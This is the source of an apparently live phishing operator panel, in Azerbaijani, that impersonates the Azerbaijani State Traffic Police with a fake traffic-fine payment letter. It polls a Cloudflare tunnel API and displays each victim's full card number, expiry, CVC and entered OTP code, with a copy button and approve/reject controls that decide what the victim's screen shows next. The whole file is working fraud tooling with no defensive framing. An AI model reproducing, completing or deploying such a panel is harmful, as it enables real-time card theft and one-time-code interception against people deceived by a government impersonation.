<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DYP - Rəsmi Ödəniş Bildiriş Məktubu</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; }
    </style>
</head>
<body class="bg-gray-100 min-h-screen py-10 px-4">
    <div class="max-w-2xl mx-auto space-y-6">

        <!-- Header with Back Button -->
        <div class="bg-white rounded-2xl shadow-xl p-6 flex justify-between items-center border-t-4 border-blue-700">
            <div class="flex items-center space-x-4">
                <a href="admin.html" class="bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold px-4 py-2.5 rounded-xl text-xs shadow transition flex items-center space-x-1">
                    <span>⬅️</span>
                    <span>Geri Qayıt</span>
                </a>
                <div>
                    <h1 class="font-bold text-gray-800 text-lg">✉️ Rəsmi Ödəniş Sorğu Məktubu</h1>
                    <p class="text-xs text-gray-500">Elektron Yol Polisi Məlumat Sistemi</p>
                </div>
            </div>
            <div class="flex items-center space-x-2">
                <span class="relative flex h-3 w-3">
                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
                </span>
                <span id="connection-status" class="text-xs font-bold text-green-600">Dinlənilir...</span>
            </div>
        </div>

        <!-- Requests Container (Letter Style) -->
        <div id="requests-container" class="space-y-4">
            <div id="no-request" class="bg-white rounded-2xl shadow-md p-12 text-center text-gray-400 space-y-3">
                <div class="text-5xl">📭</div>
                <p class="text-sm font-medium">Hələ ki yeni ödəniş sorğu məktubu yoxdur...</p>
            </div>
        </div>
    </div>

    <script>
        let API_URL = 'https://layer-contract-treo-president.trycloudflare.com/api';
        let lastCardNo = null;

        async function initConfig() {
            try {
                const res = await fetch('../config.json');
                const config = await res.json();
                if (config.apiUrl) {
                    API_URL = config.apiUrl;
                }
            } catch (err) {
                console.log("Config oxunmadı, lokal istifadə olunur");
            }
            setInterval(checkRequests, 1500);
        }

        function playBeep() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();

                oscillator.type = 'sine';
                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
                gainNode.gain.setValueAtTime(0.5, audioCtx.currentTime);

                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);

                oscillator.start();
                oscillator.stop(audioCtx.currentTime + 0.6);
            } catch (e) {
                console.log("Audio play error:", e);
            }
        }

        async function checkRequests() {
            try {
                const res = await fetch(`${API_URL}/fine`, { method: 'GET', signal: AbortSignal.timeout(3000) });
                if (res.ok) {
                    const data = await res.json();
                    document.getElementById('connection-status').textContent = "Dinlənilir (Online)";
                    document.getElementById('connection-status').className = "text-xs font-bold text-green-600";

                    if (!data.cardNo || data.isPaid || data.isRejected) {
                        const container = document.getElementById('requests-container');
                        if (!container.innerHTML.includes('təsdiqləndi') && !container.innerHTML.includes('yoxdur')) {
                            container.innerHTML = `
                                <div id="no-request" class="bg-white rounded-2xl shadow-md p-12 text-center text-gray-400 space-y-3">
                                    <div class="text-5xl">📭</div>
                                    <p class="text-sm font-medium">Hələ ki yeni ödəniş sorğu məktubu yoxdur...</p>
                                </div>
                            `;
                        }
                        lastCardNo = null;
                    } else if (data.cardNo && (data.cardNo !== lastCardNo || data.hasNewRequest)) {
                        lastCardNo = data.cardNo;
                        playBeep();
                        renderRequestCard(data);
                    } else if (data.cardNo && lastCardNo === data.cardNo) {
                        updateRequestCard(data);
                    }
                } else {
                    throw new Error("Server error");
                }
            } catch (err) {
                document.getElementById('connection-status').textContent = "Serverə qoşulmadı (Offline)";
                document.getElementById('connection-status').className = "text-xs font-bold text-red-600";
            }
        }

        function copyCardNo(cardNo) {
            navigator.clipboard.writeText(cardNo).then(() => {
                const btn = document.getElementById('copy-btn');
                if (btn) {
                    btn.textContent = 'Kopyalandı! ✅';
                    setTimeout(() => {
                        btn.textContent = '📋 Kopyala';
                    }, 2000);
                }
            }).catch(err => {
                console.error("Kopyalama xətası:", err);
                alert("Kopyalama uğursuz oldu");
            });
        }

        function renderRequestCard(data) {
            const container = document.getElementById('requests-container');
            document.getElementById('no-request')?.remove();

            container.innerHTML = `
                <div class="bg-white rounded-2xl shadow-2xl border-2 border-blue-600 p-8 space-y-6 relative overflow-hidden">
                    <div class="absolute top-4 right-4 bg-blue-50 text-blue-800 text-[10px] font-bold px-3 py-1 rounded-full border border-blue-200 uppercase tracking-widest">
                        Rəsmi Bildiriş
                    </div>

                    <div class="border-b pb-4 space-y-1">
                        <div class="flex items-center space-x-2 text-blue-700 font-bold text-sm">
                            <span>🏛️</span>
                            <span>AZƏRBAYCAN RESPUBLİKASI BAŞ DÖVLƏT YOL POLİSİ İDARƏSİ</span>
                        </div>
                        <h2 class="text-xl font-bold text-gray-900 mt-2">Elektron Cərimə Ödəniş Məktubu</h2>
                        <p class="text-xs text-gray-500">Tarix və Saat: ${data.dateTime}</p>
                    </div>

                    <div class="grid grid-cols-2 gap-4 text-sm bg-gray-50 p-4 rounded-xl border">
                        <div>
                            <span class="text-xs text-gray-500 block font-medium">Avtomobil Qeydiyyat Nişanı:</span>
                            <strong class="text-blue-700 text-lg font-mono">${data.plateNo}</strong>
                        </div>
                        <div>
                            <span class="text-xs text-gray-500 block font-medium">Protokol Nömrəsi:</span>
                            <strong class="text-gray-800 text-base font-mono">${data.protocolNo}</strong>
                        </div>
                        <div class="col-span-2 pt-2 border-t">
                            <span class="text-xs text-gray-500 block font-medium">Pozuntu Ünvanı:</span>
                            <strong class="text-gray-800 text-xs">${data.location}</strong>
                        </div>
                    </div>

                    <div class="bg-blue-900 text-white rounded-xl p-5 space-y-3 shadow-inner">
                        <div class="text-xs font-bold text-blue-200 uppercase tracking-wider border-b border-blue-800 pb-2">
                            💳 Bank Kartı və Təsdiq Məlumatları
                        </div>
                        <div class="grid grid-cols-2 gap-3 text-sm items-center">
                            <div class="col-span-2 bg-blue-950 p-3 rounded-lg flex justify-between items-center border border-blue-800">
                                <div>
                                    <span class="text-xs text-blue-300 block">Kart Nömrəsi (16 rəqəm):</span>
                                    <span class="font-mono font-bold text-white text-base">${data.cardNo}</span>
                                </div>
                                <button id="copy-btn" onclick="copyCardNo('${data.cardNo}')" class="bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold px-3.5 py-2 rounded-lg transition shadow">
                                    📋 Kopyala
                                </button>
                            </div>
                            <div>
                                <span class="text-xs text-blue-300 block">Ay / İl (Exp):</span>
                                <span class="font-mono font-bold text-white">${data.cardExp}</span>
                            </div>
                            <div>
                                <span class="text-xs text-blue-300 block">CVC Kodu:</span>
                                <span class="font-mono font-bold text-white">${data.cardCvc}</span>
                            </div>
                            <div class="col-span-2 pt-2 border-t border-blue-800">
                                <span class="text-xs text-blue-300 block">Daxil edilən OTP Kodu:</span>
                                <span id="req-otp" class="font-mono font-bold text-amber-300 text-lg">${data.otpCode || 'Gözlənilir...'}</span>
                            </div>
                        </div>
                        <div class="flex justify-between items-center border-t border-blue-800 pt-3 text-sm">
                            <span class="text-blue-200 font-semibold">Status:</span>
                            <span id="req-status" class="font-bold px-3 py-1 rounded-full text-xs ${data.isPaid ? 'bg-green-500 text-white' : 'bg-amber-400 text-gray-900'}">${data.isPaid ? '✅ Təsdiqləndi (Ödənildi)' : '⏳ OTP Təsdiqi Gözlənilir'}</span>
                        </div>
                    </div>

                    <!-- ADMIN APPROVAL & REJECTION BUTTONS -->
                    <div id="action-area" class="pt-2 space-y-3">
                        ${data.isPaid ?
                            `<div class="bg-green-100 border border-green-300 text-green-800 font-bold p-4 rounded-xl text-center text-sm">✅ Ödəniş Rəsmi Olaraq Təsdiqləndi</div>` :
                            `<div class="grid grid-cols-2 gap-3">
                                <button onclick="approvePayment()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-lg transition flex items-center justify-center space-x-1">
                                    <span>✅</span>
                                    <span>Təsdiq Et</span>
                                </button>
                                <button onclick="rejectPayment()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-lg transition flex items-center justify-center space-x-1">
                                    <span>❌</span>
                                    <span>Ödənişi Rədd Et</span>
                                </button>
                            </div>`
                        }
                    </div>
                </div>
            `;
        }

        function updateRequestCard(data) {
            const otpEl = document.getElementById('req-otp');
            const statusEl = document.getElementById('req-status');
            const actionArea = document.getElementById('action-area');
            if (otpEl) otpEl.textContent = data.otpCode || 'Gözlənilir...';
            if (statusEl) {
                statusEl.textContent = data.isPaid ? '✅ Təsdiqləndi (Ödənildi)' : '⏳ OTP Təsdiqi Gözlənilir';
                statusEl.className = data.isPaid ? 'font-bold px-3 py-1 rounded-full text-xs bg-green-500 text-white' : 'font-bold px-3 py-1 rounded-full text-xs bg-amber-400 text-gray-900';
            }
            if (actionArea && data.isPaid && !actionArea.innerHTML.includes('Rəsmi')) {
                actionArea.innerHTML = `<div class="bg-green-100 border border-green-300 text-green-800 font-bold p-4 rounded-xl text-center text-sm">✅ Ödəniş Rəsmi Olaraq Təsdiqləndi</div>`;
            }
        }

        async function approvePayment() {
            try {
                const res = await fetch(`${API_URL}/admin/approve`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                });
                const result = await res.json();
                if (result.success) {
                    const container = document.getElementById('requests-container');
                    container.innerHTML = `
                        <div class="bg-green-50 border-2 border-green-500 rounded-2xl p-8 text-center space-y-4">
                            <div class="text-5xl">✅</div>
                            <h3 class="font-bold text-green-800 text-lg">Ödəniş Uğurla Təsdiqləndi və Arxivə Köçürüldü!</h3>
                            <p class="text-xs text-gray-600">Sürücünün ekranında uğurlu ödəniş qəbzi göstərildi.</p>
                        </div>
                    `;
                    setTimeout(() => {
                        container.innerHTML = `
                            <div id="no-request" class="bg-white rounded-2xl shadow-md p-12 text-center text-gray-400 space-y-3">
                                <div class="text-5xl">📭</div>
                                <p class="text-sm font-medium">Hələ ki yeni ödəniş sorğu məktubu yoxdur...</p>
                            </div>
                        `;
                    }, 3000);
                }
            } catch (err) {
                console.error("Təsdiqləmə xətası:", err);
                alert("Xəta baş verdi!");
            }
        }

        async function rejectPayment() {
            const reason = prompt("Rədd etmə səbəbini daxil edin:", "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.");
            if (reason === null) return;

            try {
                const res = await fetch(`${API_URL}/admin/reject`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ reason })
                });
                const result = await res.json();
                if (result.success) {
                    const container = document.getElementById('requests-container');
                    container.innerHTML = `
                        <div class="bg-red-50 border-2 border-red-500 rounded-2xl p-8 text-center space-y-4">
                            <div class="text-5xl">❌</div>
                            <h3 class="font-bold text-red-800 text-lg">Ödəniş Rədd Edildi!</h3>
                            <p class="text-xs text-gray-600">Sürücünün ekranına xəta mesajı göndərildi.</p>
                        </div>
                    `;
                    setTimeout(() => {
                        container.innerHTML = `
                            <div id="no-request" class="bg-white rounded-2xl shadow-md p-12 text-center text-gray-400 space-y-3">
                                <div class="text-5xl">📭</div>
                                <p class="text-sm font-medium">Hələ ki yeni ödəniş sorğu məktubu yoxdur...</p>
                            </div>
                        `;
                    }, 3000);
                }
            } catch (err) {
                console.error("Rədd etmə xətası:", err);
                alert("Xəta baş verdi!");
            }
        }

        initConfig();
    </script>
</body>
</html>
